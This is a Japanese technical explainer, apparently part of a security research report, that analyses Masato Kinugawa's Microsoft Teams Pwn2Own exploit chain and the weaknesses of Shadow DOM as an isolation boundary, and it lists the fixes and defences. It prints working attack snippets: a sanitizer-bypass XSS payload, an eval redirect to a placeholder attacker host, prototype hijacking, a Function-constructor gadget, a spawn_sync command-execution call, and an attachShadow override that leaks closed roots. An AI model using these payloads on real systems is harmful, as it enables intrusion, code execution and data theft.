## Kinugawaの実例（Teams Pwn2Own / Shadow DOM）

日本人セキュリティリサーチャーである衣川衛(Masato Kinugawa)氏は、渋谷.XSSという勉強会シリーズを主催しながら、Microsoft・Google・GitLabなど大手ベンダーの製品で数々のXSSを発見し続けている。中でも2022年のPwn2Own Vancouverで発表されたMicrosoft Teamsのリモートコード実行(RCE)は、「たった一つのXSS」がどのようにしてOSコマンド実行にまで発展するかを示す極めて完成度の高い実例である。本節では、(1) Teamsのバグバウンティ本体($150,000)の技術的な連鎖、(2) 同じ調査の中で見つかった関連の脆弱性（渋谷.XSS #12で語られた別件、約2000万円規模のバウンティ）、(3) Shadow DOMをセキュリティ境界として使うことの危険性（渋谷.XSS #13）、の3本立てで解説する。

### 前提知識：Electronアプリの権限モデル

Microsoft Teamsのデスクトップ版（2022年当時、Windows/macOS向けクラシック版）は、Chromiumとブラウザプロセスを組み合わせた**Electron**フレームワークで作られていた。Electronアプリでは、Webページ相当のレンダラープロセスに対して、Node.jsのAPI（ファイルシステム、`child_process`など）へのアクセス権を与えるかどうかを設定で制御できる。

- `nodeIntegration`: レンダラーで直接`require()`などNode APIを使えるかどうか
- `contextIsolation`: レンダラーのJavaScript実行コンテキスト（メインワールド）と、Electronがpreloadスクリプトで公開するAPIの実行コンテキストを別のV8コンテキストに分離するかどうか
- `sandbox`: レンダラープロセスをOSレベルのサンドボックスに閉じ込めるかどうか

通常のWebページなら「XSSが刺さっても被害はそのオリジンのDOM操作やCookie窃取まで」で済むことが多いが、Electronアプリで`contextIsolation: false`や`nodeIntegration: true`が有効なままXSSが成立すると、**XSS一発がそのままローカルマシン上の任意コード実行に直結する**。TeamsのPwn2Own攻撃はこの構造を正面から突いたものである。

### ステップ1：チャットメッセージ経由のXSS（サニタイザのバイパス）

TeamsのチャットUIはAngularJSベースで実装されており、ユーザーが送信したリッチテキスト（HTML）は`sanitize-html`というNode.jsライブラリでサニタイズされてからレンダリングされる。`sanitize-html`は許可するタグ・属性・属性値をホワイトリスト形式で指定するライブラリで、Teamsの設定では、絵文字や書式設定用のCSSクラスを表示するために`class`属性の値として`swift-*`や`ts-image*`、`emoticon-*`といったワイルドカードパターンを許可していた。

問題は、このホワイトリストが「`swift-`で始まる文字列なら何でも許可」という**緩すぎる正規表現ベースの検証**になっていたことである。一方、AngularJS（当時のTeamsが使っていたバージョン）には、`class`属性の値をパースして`ng-init`のようなディレクティブ相当の文字列を抽出し、それをAngular式として評価してしまう機能が存在した。具体的には、クラス名を次のような正規表現でパースし、`ng-init`らしき部分をAngular式として`$eval`する挙動があった。

```
/([\w-]+)(?::([^;]+))?;?/
```

このパーサーは「セミコロン区切りの `name:value` ペア」としてクラス文字列全体を解釈するため、`swift-`という許可された接頭辞さえ含んでいれば、その後ろに任意の文字列を`;`で連結して追加のディレクティブとして注入できる。衣川氏が実際に使用したペイロードは次のようなものだった。

```html
<strong class="swift-x;ng-init:['alert(document.domain)']
.forEach($root.$$childHead.$$nextSibling.app.$window.eval)">aaa</strong>
```

**なぜ動くか**を分解すると：

1. `class="swift-x;..."` の `swift-x` の部分だけを見ればサニタイザのホワイトリスト（`swift-*`）に一致するため、`class`属性ごと許可される。
2. しかしAngularJS側のクラス属性パーサーは、`;`以降を独立したディレクティブとして再解釈する。ここで`ng-init:[式]`という構文が「`ng-init`ディレクティブに配列`['alert(document.domain)']`を渡す」という意味になる。
3. 渡した配列に対して`.forEach(...)`を呼び出し、コールバックとして`$root.$$childHead.$$nextSibling.app.$window.eval`（Angularのスコープツリーを辿って到達できる`window.eval`相当の関数）を渡している。`forEach`は各要素（この場合は文字列`'alert(document.domain)'`）を第一引数としてコールバックに渡すので、結果的に`eval('alert(document.domain)')`が実行される。

つまり「サニタイザは`class`属性という*入れ物*のフォーマットしか検証しておらず、その中身をアプリケーション側フレームワーク（AngularJS）が独自の文法として再解釈する」というパーサー不一致（mutation/re-interpretationの一種）を突いた、教科書的なサニタイザバイパスである。チャットメッセージは相手に送るだけで開かせられるため、ユーザー操作は「メッセージを開いて見る」だけで発火する。

実際の攻撃では、この`eval`経由で即座に`alert`を出すのではなく、次のような形で外部の攻撃用ページへ誘導する処理を仕込んでいた。

```html
eval(decodeURIComponent(
  'setTimeout(function(){location.replace("//attacker.example.com/poc.html")},10000)'
))
```

これは「メッセージを開いた10秒後に、Teamsのレンダラー内でこっそり攻撃者のページへ`location.replace`する」という時間差トリガーであり、被害者に不審に思わせにくくする実戦的な工夫である。

> 出典: How I Hacked Microsoft Teams and got $150,000 in Pwn2Own — https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own

### ステップ2：プロトタイプ汚染からNode API窃取（Context Isolation回避）

XSSでJavaScriptが実行できても、それだけでは「Teamsのメインウィンドウのレンダラー内で好きなJSが動く」レベルに過ぎない。当時のTeamsのメインウィンドウは`contextIsolation: false`で動作しており、preloadスクリプトが公開したNode由来のオブジェクト（`ipcRenderer`など）はメインワールドの`window`から直接触れるグローバル空間の中、あるいはモジュールキャッシュの中に存在していた。

衣川氏は、`Function.prototype.call`を独自の関数で上書きするという手法で、Webpackのモジュールローダー（`__webpack_require__`）がモジュールを呼び出す際の内部呼び出しを乗っ取り、その引数からモジュール参照オブジェクトを取得した。これはいわゆる**プロトタイプ汚染／プロトタイプチェーン改ざん**の応用で、「アプリケーションが内部的に呼んでいる関数の実行を、組み込みメソッドの差し替えによって外部から観測・横取りする」という考え方である。

```js
// 概念的な例：Function.prototype.call を横取りして
// webpack の内部呼び出し時の引数(モジュールオブジェクト)を盗み見る
const originalCall = Function.prototype.call;
Function.prototype.call = function (...args) {
  // args[1] などに webpack が渡すモジュール参照が紛れ込む
  stolenModule = args[1];
  return originalCall.apply(this, args);
};
```

こうして`ipcRenderer`（ElectronのIPC通信オブジェクト）の参照を手に入れることで、レンダラーからメインプロセス側で処理されるIPCメッセージを自由に送信できるようになった。これが「XSS」から「Electronの内部通信を直接叩ける」への権限昇格の第一段階である。

### ステップ3：PluginHostのサンドボックス外実行でOSコマンド実行へ

Teamsには、通話プラグインなどを動かすための`PluginHost`という不可視のレンダラープロセスが存在し、これはメインウィンドウとは異なり`--no-sandbox`（OSサンドボックス無効）で動作していた。そしてこのPluginHostは、`slimcore`というネイティブNodeモジュールをElectronの`remote`モジュール相当の仕組み（`ELECTRON_REMOTE_SERVER_REQUIRE`→`ELECTRON_REMOTE_SERVER_MEMBER_GET`→`ELECTRON_REMOTE_SERVER_FUNCTION_CALL`というIPCチャンネル列）経由でメインプロセス側から操作できるようになっていた。

問題は、この`remote`的な仕組みが「どのプロパティ／メソッドへのアクセスを許可するか」を十分に検証していなかったことである。ステップ2で得たIPC送信能力を使い、`require('slimcore')`のような呼び出しをIPC経由でリモート実行させ、そのオブジェクトから`.toString.constructor`と辿ることで、文字列から任意コードを生成する`Function`コンストラクタに到達できた。

```js
// 概念（実際はIPC経由でメインプロセスに送るメッセージ列として組み立てる）
require('slimcore').toString.constructor('任意のJSコード')()
```

**なぜこれが危険か**：`obj.toString`はどんなオブジェクトでも継承している組み込みメソッドであり、その`.constructor`は`Function`である。`Function('コード文字列')`は`eval`と同じく任意の文字列をJavaScriptとしてコンパイル・実行できる。つまり「プロパティを辿って`Function`コンストラクタに到達できるかどうか」を検証していないIPCブリッジは、実質的に「何でも実行できるIPC」と同義になる。

最終的に、そのコード内から`process.binding("spawn_sync")`というNode内部APIを直接呼び出すことで、OSレベルのプロセス生成（`cmd /k start calc`のような任意コマンド実行）に到達した。

```js
process.binding("spawn_sync").spawn({
  file: "cmd",
  args: ["/k", "start", "calc"],
  stdio: [a, a]
});
```

`calc`（電卓）の起動はPwn2Ownのようなコンテストで「任意コード実行が成立した」ことを審査員に視覚的に証明するための伝統的なデモ手法であり、実際の攻撃では任意の悪意あるコマンドに置き換えられる。

### 修正内容とインパクトのまとめ

Microsoftはこの報告を受けて複数レイヤーで修正を行った。

- メインウィンドウの`contextIsolation`を`true`に変更（レンダラーのメインワールドとpreload公開APIのコンテキストを分離）
- `class`属性のホワイトリスト検証を、単純な前方一致的な正規表現から、値全体を厳密にパースする方式へ強化（`;`で追加のディレクティブを継ぎ足せないように修正)
- `PluginHost`のpreloadスクリプトにCSPを適用し、任意文字列からのコード生成（`eval`・`Function`コンストラクタ）を禁止
- Electron本体側でもv25以降、`nodeIntegration`/`contextIsolation`のデフォルト値の安全化や、`remote`モジュール自体の廃止が進んだ

この一件が$150,000という高額評価を受けた理由は、単体のXSSではなく、**(a) Webアプリ層のサニタイザ回避XSS → (b) Electronのコンテキスト分離欠如によるNode API奪取 → (c) IPCブリッジの検証不備による任意コード生成 → (d) ネイティブAPI直叩きによるOSコマンド実行**という4段階の連鎖を、リンクを踏ませる必要すらなく「チャットメッセージを開くだけ」で完結させたためである。XSSはしばしば「Webページの中だけの被害」と軽視されがちだが、Electronのようなネイティブアプリの土台がWebレンダラーである場合、XSSはOSレベルの権限昇格の入口になり得るという典型例といえる。

### 補足：渋谷.XSS #12で語られた関連バウンティ（約2000万円）

渋谷.XSSのトークテーマ#12では、上記Pwn2Ownの内容と重なる形で、同じ調査ラインの中でMicrosoft Teamsについて見つかった別件の脆弱性が語られている。技術的な骨格は前節と共通しており、AngularJSのクラス属性パース処理を悪用したサニタイザバイパスによるXSSと、Electronの`contextIsolation`欠如を組み合わせて、プロトタイプ汚染経由で`ipcRenderer`を奪い取る手法が中心である。日本円で2000万円規模という報奨額の大きさは、Microsoftの独自バグバウンティプログラム（Microsoft Teamsに対する個別のリサーチプログラム）における深刻度評価の高さを反映しており、Pwn2Ownの$150,000と合わせて「1つのXSSの発見が、条件が揃えば非常に高額な報奨につながる」ことを示す実例である。

> ⚠️ **未取得の資料についての補足**: 渋谷.XSS #12のスライド本文はWebFetch経由でテキストとして取得できたが、スライド画像内のコードスニペットの一部（正確な行番号・変数名の詳細）までは機械的なテキスト抽出の制約上、完全な再現はできていない。ここでは公開情報として判明している技術的骨格（脆弱性の種類・悪用の流れ・原理）のみを記載し、被害を拡大しうる完全なエクスプロイト手順の再掲は避けている。

> 出典: 渋谷.XSS techtalk #12 — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-12

### Shadow DOMはセキュリティ境界にならない（渋谷.XSS #13）

渋谷.XSS #13では、Web Componentsの構成要素である**Shadow DOM**を「隔離の手段」として過信することの危険性がまとめられている。前提として、Shadow DOMは`element.attachShadow({mode: 'open' | 'closed'})`で作成する、通常のDOMツリーから独立したサブツリーであり、コンポーネント内部のCSSセレクタや`querySelector`のスコープを外部から隔離することで、UIコンポーネントの実装詳細を隠蔽し、名前衝突を避けるための**開発上の便宜機能**として設計されたものである。

```js
const shadow = element.attachShadow({ mode: 'closed' });
shadow.innerHTML = '<div class="secret">機密情報</div>';
```

`mode: 'closed'`にすると`element.shadowRoot`が`null`を返すため、一見「外部からアクセス不能な隠し部屋」に見える。しかし資料は、これを**セキュリティ境界として使うのは無理がある**と結論付けている。理由は次の通りである。

#### 1. プロトタイプ改ざんによる強制公開

`closed`モードは「`attachShadow()`の戻り値を外部に渡さない」というだけの取り決めであり、ブラウザのAPIレベルで暗号学的に保護されているわけではない。攻撃者が対象のコンポーネントが`attachShadow`を呼び出す**前**に、次のように`Element.prototype.attachShadow`自体を書き換えてしまえば、モード指定に関わらず`open`相当の動作を強制し、戻り値を横取りできる。

```js
const original = Element.prototype.attachShadow;
Element.prototype.attachShadow = function (init) {
  const root = original.call(this, { ...init, mode: 'open' });
  // root を外部の変数に保存しておけば、後から中身を読める
  window.__leakedRoots = window.__leakedRoots || [];
  window.__leakedRoots.push(root);
  return root;
};
```

これは、同一のJavaScript実行コンテキスト（同じオリジンの同じページ内）で先にコードが走れる状況、たとえば拡張機能を使わない一般的なXSSの文脈でも十分に成立する攻撃であり、「`closed`だから安全」という思い込みを崩すものである。

#### 2. Selectionやイベント経由でのノードリーク

ブラウザが提供する別のAPIを経由すると、`closed` Shadow DOMの内部ノードに、`attachShadow`のAPIを直接叩かずに到達できる場合がある。資料で挙げられている手法には次のようなものがある。

- `window.find('検索文字列')`でページ内テキスト検索を行い、ヒットした範囲を`getSelection()`で取得すると、`anchorNode`がShadow DOM内部のテキストノードを指すことがある。
- `document.execCommand('insertHTML', false, '<div>...</div>')`を使うと、選択範囲がShadow DOM内にある場合にその内部へHTMLを挿入できてしまう。
- Firefox固有の`Event.originalTarget`や`UIEvent.rangeParent`は、標準の`event.target`が返す「Shadow DOMの境界でリターゲットされた要素」を飛び越えて、内部の実ノードを直接返す。
- `InputEvent.getTargetRanges()`（ブラウザの`beforeinput`イベントで使われるAPI）が返す`StaticRange`オブジェクトの`startContainer`/`endContainer`は、Chrome・Firefox・Safariいずれでも内部ノードを指すケースがあり、クロスブラウザで再現できる。

これらはいずれも「Shadow DOMの外側にあるAPI（テキスト検索、編集コマンド、入力イベント）が、内部実装としてShadow DOM境界の内側のノードに触れてしまい、その参照が呼び出し元コードに漏れる」というパターンであり、Shadow DOM自体のAPI（`shadowRoot`プロパティなど）を塞いだだけでは防ぎきれないことを示している。

#### 3. CSS経由の情報漏洩

Shadow DOM内のスタイルは、セレクタ自体のスコープは分離されるが、`color`や`font-family`のような**継承プロパティ**は境界を越えて伝わる。資料では、合字（リガチャ）に対応したWebフォントを利用し、Shadow内のテキストに応じてフォントの合字処理でレンダリング幅が変化することを利用し、`ResizeObserver`などで幅の変化を観測することで、1文字ずつ機密情報（例えばCSRFトークンや個人情報の断片）を推測・抽出できる可能性が指摘されている。これはCSS injectionを使った古典的なサイドチャネル攻撃（フォントやスタイルの副作用を使ったleak）のShadow DOM版といえる。

さらに、`:host-context()`という擬似クラス関数を使うと、Shadow内部のスタイルシートから祖先要素（Shadow DOMの外側）の属性やクラスに反応したスタイルを書けてしまうため、Shadow内のCSSが外側の情報を間接的に参照できてしまう点も、分離が不完全であることの一例として挙げられている。

#### 4. その他の抜け道

- `name`属性を持つ`<iframe>`をShadow DOM内に置いた場合、ブラウザのナビゲーション制御（`window.open`のターゲット名解決など）がShadow境界を意識しない実装になっていることがあり、外側から間接的にiframeのナビゲーションへ干渉できる余地が指摘されている。
- Content Security Policy（CSP）の違反レポートには、違反が発生したリソースのURLなど内部情報が含まれることがあり、Shadow DOM内で発生したCSP違反がイベントとして外側に伝播する際に、隠しているはずの内部URLがリークするケースがある。

### 現実的な防御方針

資料の結論は明快で、「Shadow DOMは便利なコンポーネント化のツールであって、隔離を保証するセキュリティ機構ではない」という一点に尽きる。実務上の指針としては次のように整理できる。

- **Webアプリケーション開発者**: サードパーティコンテンツや信頼できない入力をアプリ内で隔離したいなら、Shadow DOMではなく`<iframe sandbox>`やSame-Origin Policy、Site Isolationのような、ブラウザベンダーが明確にセキュリティ境界として設計・保証している機構を使うべきである。どうしてもDOM内での隔離が必要な特殊要件（例：Salesforceの Lightning Web Security のような制限付きJS実行環境）であれば、独自にサンドボックス相当の実行環境をゼロから構築する覚悟が必要になる。
- **ブラウザ拡張機能開発者**: Content Script側でShadow DOMを使ってUIをページに注入する場合、ページ側のJavaScriptとは別のJS実行コンテキスト（別のワールド）で動いているため、ページ側が`Element.prototype.attachShadow`を汚染していても影響を受けない。この「実行コンテキストが分離されているかどうか」こそが実質的な防御線であり、Shadow DOM自体の機能ではないことに注意する必要がある。

XSS対策の文脈で言えば、「Shadow DOM内にレンダリングしているから、たとえXSSが起きても閉じ込められる」という設計判断は誤りであり、根本的な対策（適切なサニタイズ、CSP、テンプレートエンジンでの自動エスケープ）を代替するものではない、という点が本節全体を通じた重要な教訓である。

> 出典: 渋谷.XSS techtalk #13 — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-13
